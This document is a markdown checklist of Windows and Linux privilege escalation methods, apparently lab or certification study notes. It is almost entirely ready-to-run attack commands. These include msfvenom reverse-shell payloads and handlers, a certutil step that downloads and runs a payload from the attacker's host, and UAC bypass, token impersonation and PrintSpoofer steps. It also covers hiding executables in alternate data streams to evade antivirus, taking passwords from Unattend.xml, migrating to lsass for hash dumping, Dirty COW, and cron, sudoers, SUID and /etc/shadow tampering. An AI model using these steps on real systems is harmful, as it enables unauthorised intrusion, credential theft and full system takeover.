### Windows Privilege Escalation:

### 🟦 Windows Privilege Escalation (Post-Exploitation)

#### 🔍 Recon & Enumeration
- [ ] `meterpreter> getuid` – Check current user
- [ ] `meterpreter> getprivs` – List current privileges
- [ ] `meterpreter> sysinfo` – Get OS version details
- [ ] `meterpreter> background` – Background session for module use

#### 🔧 Privilege Escalation Attempt (Auto)
- [ ] Use: `post/multi/recon/local_exploit_suggester`
- [ ] Set `SESSION <id>`
- [ ] Run the module
- [ ] Review list of suggested local exploits (kernel and non-kernel)

#### 🧨 Kernel Exploit (Manual)
- [ ] Identify Windows version & missing patches
- [ ] Use: **Windows Exploit Suggester**  
      🔗 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- [ ] Use: **Windows Kernel Exploits CVE List**  
      🔗 https://github.com/SecWiki/windows-kernel-exploits
- [ ] Search for CVE-specific exploit (e.g. `ms16_014_wmi_recv_notif`)
- [ ] Use module: `exploit/windows/local/ms16_014_wmi_recv_notif`
- [ ] Set `SESSION <id>`
- [ ] Run the exploit

#### ⚠️ Notes
- [ ] Kernel exploits can crash systems – **use only in labs or CTFs**
- [ ] Windows NT has **User mode** (limited) and **Kernel mode** (full)
- [ ] Goal: elevate to `NT AUTHORITY\SYSTEM`

#### ✅ Post Exploitation
- [ ] Run `getuid` to confirm SYSTEM access
- [ ] Run `getprivs` to verify new privileges

---

### 🟦 Windows Privilege Escalation – Second Method (Manual Exploit)

#### 🔍 System Info Collection
- [ ] `meterpreter> shell` – Drop into shell
- [ ] `C:\> systeminfo` – Get full system info
- [ ] Copy the output and save to `win7.txt` on your host machine

#### 🛠️ Windows Exploit Suggester
- [ ] Clone & enter: `windows-exploit-suggester` tool  
      🔗 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- [ ] `./windows-exploit-suggester --update` – Download latest DB
- [ ] `./windows-exploit-suggester --database 2021-12-26-mssb.xls --systeminfo win7.txt`
- [ ] Review suggested exploits  
      - `E` = exploit-db exploit  
      - `M` = Metasploit module  
      - `*` = missing patch

#### 💥 Try Kernel Exploit (e.g. `MS16-135`)
- [ ] Get the `.exe` exploit from:  
      🔗 https://github.com/SecWiki/windows-kernel-exploits
- [ ] Rename to `41015.exe` or similar

#### 📂 Upload & Execute Exploit
- [ ] `meterpreter> cd Temp\\` – Move to less-visible temp dir
- [ ] `meterpreter> upload 41015.exe` – Upload the binary
- [ ] `meterpreter> shell` – Back to shell
- [ ] `C:\Temp> .\41015.exe 7` – Run exploit (7 = Win version)
- [ ] Wait – exploit may take some time, no instant output

#### ✅ Post Exploitation Check
- [ ] `C:\> whoami` – Confirm `nt authority\system` access

---

## Windows Privilege Escalation Checklist

- [ ] **Use PrivescCheck**  
  - Download from https://github.com/itm4n/PrivescCheck  
  - Run on target with:  
    `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`  
  - Check for Windows config issues and possible credentials  

- [ ] **Web Delivery Exploit with Metasploit**  
  - `use exploit/multi/script/web_delivery`  
  - `set target PSH (Binary)`  
  - `set payload windows/shell/reverse_tcp`  
  - `set PSH-EncodedCommand false`  
  - `set lhost <your-ip>`  
  - `run`  
  - Copy generated PowerShell command and execute on target machine to get a shell  
  - Upgrade shell to meterpreter  

- [ ] **Upgrade Shell to Meterpreter**  
  - `use post/multi/manage/shell_to_meterpreter`  
  - `set lhost <your-ip>`  
  - `set session <id>`  
  - `set WIN_TRANSFER VBS`  
  - `run`  
  - Migrate to a stable process  

- [ ] **Use Credentials from PrivescCheck**  
  - Use credentials (e.g., from winlogon) with psexec:  
    `psexec.py Administrator@<target>`  
  - Enter password when prompted  
  - Get NT AUTHORITY\SYSTEM access  

- [ ] **Metasploit psexec Module for Privilege Escalation**  
  - `use exploit/windows/smb/psexec`  
  - Set `rhost`, `smbuser`, `smbpass`  
  - Run exploit to get meterpreter session with elevated privileges  
  - No need to set session for this module  


---
### 🟥 Bypassing UAC with UACMe – Windows Privilege Escalation

#### 🔐 What is UAC (User Account Control)?
- Prevents unauthorized system changes.
- Non-admin users get credential prompts.
- Admin users get consent prompts.
- Can be bypassed if UAC level is set to "low".
- UACMe exploits AutoElevate features to bypass UAC.

### 🧠 Pre-checks Before Exploitation
- [ ] `C:\> net users` – List all users
- [ ] `C:\> net localgroup administrators` – See if current user is in admin group

### 🟡 Gaining Initial Foothold (Optional)
- [ ] `msf> setg RHOST <ip>`
- [ ] `use exploit/windows/http/rejetto_hfs_exec` – Get initial access
- [ ] `run`
- [ ] `meterpreter> sysinfo`
- [ ] `meterpreter> pgrep explorer`
- [ ] `meterpreter> migrate <pid>` – Migrate to explorer.exe (x64 process)
- [ ] `meterpreter> getprivs`
- [ ] `meterpreter> shell`
- [ ] `C:\> net user`
- [ ] `C:\> net localgroup administrators`

### 📁 Locate UACMe Executables
- UACMe compiled payloads found in:  
  `UACMe/Source/Akagi/bin`

### 🛠️ Steps to Bypass UAC

#### 1. ✅ Get Build Version of Target
- Check version using:
  - `systeminfo`
  - Match with UACMe method from repo:
    🔗 https://github.com/hfiref0x/UACME

#### 2. 💉 Generate Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f exe > backdoor.exe
```

#### 3. 🎯 Setup Handler
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT 1234
run
```

#### 4. 📤 Upload & Execute Exploit
```bash
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp
meterpreter> upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter> upload backdoor.exe
meterpreter> shell
C:\Temp> .\Akagi64.exe 23 C:\Temp\backdoor.exe
```
> `23` = UAC bypass method number based on your OS version

### ✅ Verify Elevated Access in multi/handler
```bash
meterpreter> getsystem
meterpreter> getuid
meterpreter> getprivs
meterpreter> ps
meterpreter> migrate <pid>  # Migrate to SYSTEM-owned process
```

### 📎 Reference:
[Bypassing UAC with UACMe – Medium Article](https://medium.com/@Strange0/bypassing-uac-with-uacme-windows-privilege-escalation-994341ac7940)

> ⚠️ **Note:** Always choose UACMe method based on Windows version and architecture. Wrong method may fail or crash the process.


## ✅ Bypass UAC Using MSF Checklist

- [ ] **Gain Initial Access**
  - [ ] Obtain a meterpreter session on the target.
  - [ ] Test for privilege escalation:
    ```
    getsystem
    ```
  - [ ] Check current privileges:
    ```
    getprivs
    ```

- [ ] **Enumeration**
  - [ ] Check if current user is in the Administrators group:
    ```
    net localgroup administrators
    ```
  - [ ] If user is listed → UAC bypass is possible.

- [ ] **Exploitation**
  ```
  use exploit/windows/local/bypassuac_injection
  ```
  - [ ] Set target architecture:
    - If x64 → change payload accordingly.
    - **Use the same port where you already have your Rejetto meterpreter shell running. For example if you got rejetto meterpreter in 4444 then here in UAC bypass also give 4444.**
  - [ ] Configure:
    ```
    set TARGET <arch_target>
    set SESSION <id>
    set LPORT <port>
    run
    ```
  - [ ] Result → New meterpreter session with UAC disabled.

**Use the same port where you already have your Rejetto meterpreter shell running. For example if you got rejetto meterpreter in 4444 then here in UAC bypass also give 4444.**


- [ ] **Post-Bypass**
  - [ ] In new session, elevate to SYSTEM:
    ```
    getsystem
    ```

##### Migrate to lsass and hashdump:
```
ps -S lsass.exe
migrate 484
```



---

### ✅ Access Token Impersonation – Checklist

#### 🛠️ Pre-Requisites:
- [ ] Gain Meterpreter session on target
- [ ] Ensure session has **SeImpersonatePrivilege**
- [ ] Identify logged-in users with delegation tokens (e.g., via RDP)

#### 🔄 Process Migration:
- [ ] `meterpreter> pgrep explorer`
- [ ] `meterpreter> migrate <pid of explorer.exe>`
  - ✅ *Explorer is stable and helps avoid detection*

#### 🔍 Verify Privileges:
- [ ] `meterpreter> getprivs`
  - Look for: `SeImpersonatePrivilege`

#### 🔓 Load Incognito & List Tokens:
- [ ] `meterpreter> load incognito`
- [ ] `meterpreter> list_tokens -u`
  - ✅ *Identify impersonatable users (e.g., Administrator, NT AUTHORITY\SYSTEM)*

#### 👤 Impersonate User:
- [ ] `meterpreter> impersonate_token "DOMAIN\\Username"`
  - Example: `meterpreter> impersonate_token "ATTACKDEFENSE\\Administrator"`
---

### Print Spoofer Impersonate :
- [ ] - After getting access to a user, try `whoami /priv` (windows). If it has `SeImpersonatePrivilege` , then try PrintSpoofer to elevate privileges. `PrintSpoofer64.exe -i -c cmd` --> run this cmd in the machine to get system privilege.

#### 🆔 Confirm Privilege Escalation:
- [ ] `meterpreter> getuid`
- [ ] `meterpreter> getprivs`

#### 📁 Post-Exploitation:
- [ ] Check `Desktop` folder for flags or sensitive files:
  ```
  meterpreter> cd C:\Users\<username>\Desktop
  meterpreter> ls
  ```

### ❗ Tips:
- [ ] If `getprivs` fails → Migrate again to explorer and retry
- [ ] If no tokens found → Use **Potato attacks** (e.g., JuicyPotato, RoguePotato)


---



### ✅ Windows File System Vulnerabilities – Alternate Data Streams (ADS)

#### 📌 What is ADS?
- NTFS feature designed for Mac HFS compatibility
- Every NTFS file has:
  - Data stream → actual data
  - Resource stream → metadata (can be abused)
-  Used by attackers to hide malicious payloads and bypass AVs


#### 🧪 Basic ADS Test:
- [ ] `C:\> notepad test.txt:secret.txt`
  - Type some text and save
  - ✅ Only `test.txt` visible in Explorer
  - `secret.txt` is hidden inside test.txt as alternate stream

#### 🔒 Hiding an Executable (e.g., winPEAS.exe):
- [ ] `C:\> type payload.exe > winlog.txt:winPEAS.exe`
  - ✅ Stores the EXE in ADS of `winlog.txt`

#### ▶️ Executing Hidden EXE:
- [ ] Try: `C:\> start winlog.txt:winPEAS.exe`
  - ❌ May not work directly depending on Windows version

#### 🔗 Workaround: Create Symbolic Link
- [ ] `C:\> mklink wupdate.exe C:\Temp\winlog.txt:winPEAS.exe`
  - ✅ Creates a symlink

- [ ] Now run: `C:\> wupdate`
  - ✅ Executes hidden winPEAS.exe via the symlink

### 🛡️ Notes:
- [ ] ADS files are invisible to normal Windows Explorer and `dir` command
- [ ] Use tools like `Streams.exe` or `dir /R` to detect ADS
- [ ] Useful in post-exploitation to hide tools from AV or blue team

---


### ✅ Search for Passwords in Unattended Windows Config

#### 🧾 What is Unattended Windows Setup?
- Used for automated mass deployment of Windows OS.
- Uses config files that often contain **admin credentials**.
- These files are sometimes left exposed on the system.

#### 🔍 Common Locations to Check:
- [ ] `C:\Windows\Panther\Unattend.xml`
- [ ] `C:\Windows\Panther\Autounattend.xml`

> These may contain passwords (often Base64-encoded) inside `<AutoLogon>` tags.

### ⚙️ Get Meterpreter Access

1. **Generate Payload:**
   - [ ] `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=1234 -f exe > payload.exe`

2. **Host the Payload:**
   - [ ] `python -m SimpleHTTPServer 80` (or use `http.server` for Python 3)

3. **On Target System:**
   - [ ] `C:\> certutil -urlcache -f http://<your-ip>/payload.exe payload.exe`
   - [ ] `C:\> payload.exe` to execute

4. **On Attacker System:**
   - [ ] `msfconsole`
   - [ ] `use exploit/multi/handler`
   - [ ] `set payload windows/x64/meterpreter/reverse_tcp`
   - [ ] `set LHOST <your-ip>`
   - [ ] `set LPORT 1234`
   - [ ] `run`

### 🔓 Extracting Credentials

1. **Find the File:**
   - [ ] `meterpreter> search -f Unattend.xml`
   - OR manually:
     - [ ] `meterpreter> cd C:\Windows\Panther`
     - [ ] `meterpreter> download Unattend.xml`

2. **Decode Credentials:**
   - [ ] Look for `<AutoLogon>` and `<Password>` tags.
   - [ ] Copy Base64 password and decode:
     - [ ] `echo <base64-password> | base64 -d`

> ⚠️ Password may be outdated if user has changed it post-deployment.

### 👑 Gain Admin Access

- [ ] `psexec.py Administrator@<target-ip>`
- [ ] Enter the decoded password
- ✅ Gain administrative shell

`python3 /usr/share/doc/python3-impacket/examples/psexec.py ` --> run psexec.py
### 🛡️ Pro Tip:
- Always check these config files first after gaining access — they often yield **cleartext or encoded credentials**.


----


#  Linux Privilege Escalation Checklist

## ✅ Kernel Exploits:

#### 🔍 Initial Recon & Setup

- [ ] Gain initial **Meterpreter shell** or remote shell.
- [ ] Get interactive bash shell:
  - `meterpreter> shell`
  - `/bin/bash -i`
- [ ] List user accounts:
  - `cat /etc/passwd`

#### 🔧 Linux Exploit Suggester

- [ ] Upload Linux Exploit Suggester:
  - `meterpreter> upload les.sh`
  - Download from: https://github.com/The-Z-Labs/linux-exploit-suggester
- [ ] Run the tool:
  - `chmod +x les.sh`
  - `./les.sh`
- [ ] Identify applicable kernel exploits (e.g., Dirty COW, OverlayFS, etc.)

#### 💣 Exploiting Kernel Vulnerability (Example: Dirty COW)

- [ ] Search & download exploit:
  - e.g., [Dirty COW](https://www.exploit-db.com/exploits/40839)
- [ ] **Compile exploit** (preferably on target):
  - Upload source code: `meterpreter> upload dirty.c`
  - On target shell: `gcc -pthread dirty.c -o dirty -lcrypt`
- [ ] Run exploit:
  - `./dirty password123`

#### 🔐 Post-Exploitation

- [ ] Log in as created user (e.g., firefart):
  - From attacker machine: `ssh firefart@<target-ip>`
  - Password: `password123`
- [ ] Verify privilege escalation:
  - `whoami`
  - `id`
  - Try privileged commands like `apt update`
#### ⚠️ Notes:
- Kernel exploits can **crash the system** — avoid in production environments.
- `www-data` is a low-privilege service account — escalate to real users.
- Avoid directly accessing `/etc/shadow` unless root.

---

### ✅ Linux Privilege Escalation Checklist – Misconfigured Cron Jobs

#### 📅 Understanding Cron Jobs

- Cron jobs are scheduled tasks run periodically.
- Some run as **root**, making them potential escalation vectors.
- Look for writable scripts, folders, or cron job configs.

#### 🔍 Enumeration & Discovery

- [ ] Check permissions in suspect directories:
  - `ls -al`
- [ ] Get full path of the current directory:
  - `pwd`
- [ ] Search for cron job configs referencing this path:
  - `grep -rnw /usr -e "/home/student/<filename>"`
    - `-r`: recursive
    - `-n`: show line numbers
    - `-w`: match whole word

#### 💥 Exploitation Steps
- [ ] Open the referenced cron job/script.
- [ ] Confirm if the script or its directory is **writable**.
- [ ] If writable, inject a malicious payload:

  Example:
  - `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`

  Syntax breakdown:
  - `\n` = new line
  - `echo "user ALL=NOPASSWD:ALL"` = allows passwordless sudo for that user
  - Appended to `/etc/sudoers` via cron job execution

- [ ] Wait for the cron job to execute (usually within 1 minute).
- [ ] Switch to root:
  - `sudo su`

#### 🏁 Post-Exploitation
- [ ] Check `/root` for flags or sensitive files.
- [ ] Verify full root access.

#### 🛠️ General Useful Commands
- [ ] List all cron jobs:
  - `crontab -l`
- [ ] Check `/etc/crontab` or files in `/etc/cron.*/` for system-level cron jobs.

---

### ✅ Linux Privilege Escalation Checklist – Exploiting SUID Binaries

#### 🔍 What is SUID?

- **SUID** = Set Owner User ID
- Allows a binary to run with the **owner's permissions**, not the user who launched it.
- Commonly misconfigured binaries can lead to **root shell**.
- If you find 2 binary executables in linux, check for SUID binaries to priv esc.

- [ ] If you find **two or more executable binaries**, especially custom ones:
  - [ ] Check for SUID permissions:
    ```
    find / -perm -4000 -type f 2>/dev/null
    ```
  - [ ] Look for binaries owned by root and investigate their behavior
#### 🕵️ Enumeration
- [ ] Check current user:
  - `whoami`
- [ ] List file permissions:
  - `ls -al`
- [ ] Look for SUID binaries:
  - SUID = `-rwsr-xr-x` (note the **s**)
- [ ] Identify the binary's function:
  - `file <binary-name>`
- [ ] Check what other binaries it uses:
  - `strings <binary-name>`
#### ⚠️ Exploitation Steps
- [ ] If the binary calls another internal binary (e.g., `greetings`), check its location.
- [ ] Remove the original one (if possible):
  - `rm greetings`
- [ ] Replace it with something malicious (e.g., bash shell):
  - `cp /bin/bash greetings`
- [ ] Give execute permission (if needed):
  - `chmod +x greetings`
- [ ] Run the SUID binary:
  - `./welcome`
- [ ] Confirm root shell:
  - `whoami` → should return `root`
#### 🏁 Post-Exploitation
- [ ] Check for flags or sensitive files:
  - Look in `/root`, `/etc/shadow`, etc.

---

## 🐧 Linux Privilege Escalation via Vulnerable chkrootkit

 - [ ] Gain access & upgrade shell
```
use auxiliary/scanner/ssh/ssh_login
set USERNAME <username>
set PASSWORD <password>
run
sessions -u <id>   # Upgrade shell to meterpreter
```

#### Check running processes
`ps aux`
#### Inspect suspicious binaries
`cat /bin/check-down`
#### Check chkrootkit version
`chkrootkit -V   # Vulnerable if < 0.5.0`

```
# Exploit with Metasploit
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION <id>
set LHOST <your_ip>
run
```
##### Result → Root shell via cron execution of vulnerable chkrootkit

---

```
User student may run the following commands on target:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL
```
If `NOPASSWD:ALL`
Then try 
```
sudo /bin/bash
sudo -i

# The above cmds will give u root access
```

---

## LinEnum

- [ ] **About LinEnum**  
  - Bash script for automating Linux local enumeration and privilege escalation checks  
  - Repository: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)  

- [ ] **Gain Initial Access**  
  - Exploit Shellshock to obtain a shell on the target  

- [ ] **Useful Metasploit Enumeration Modules**  
  - `enum_configs` → enumerate all configuration files  
  - `enum_network` → gather network info (routing table, DNS config, firewall rules, etc.)  
  - `enum_system` → collect system info  

- [ ] **Prepare Target for LinEnum**  
  - `meterpreter> cd /tmp` → work in `/tmp` directory  
  - `meterpreter> upload linenum.sh`  

- [ ] **Run LinEnum**  
  - `./linenum.sh`  
  - Outputs: kernel info, release version, current user/group, logged-in users, `/etc/passwd` contents, environment variables, cron jobs, available compilers, etc.  

---

## Linux Privilege Escalation Checklist

- [ ] **Check for Weak Permissions**  
  - Run: `find / -not -type l -perm -o+w`  
  - Identify writable files by all users  
  - Look for sensitive files like `/etc/shadow` with improper permissions  

- [ ] **Exploit Writable /etc/shadow**  
  - Generate hashed password:  
    `openssl passwd -1 -salt abc password`  
  - Replace root’s hash in `/etc/shadow` with generated hash  
  - Switch to root user using new password  

- [ ] **Check Sudo Privileges**  
  - Run: `sudo -l`  
  - Identify allowed binaries with root privileges  

- [ ] **Exploit Sudo Privileges**  
  - If allowed binary is `man`, run:  
    `sudo man cat`  
  - Inside man, run:  
    `!/bin/bash`  
  - Gain root shell  

---

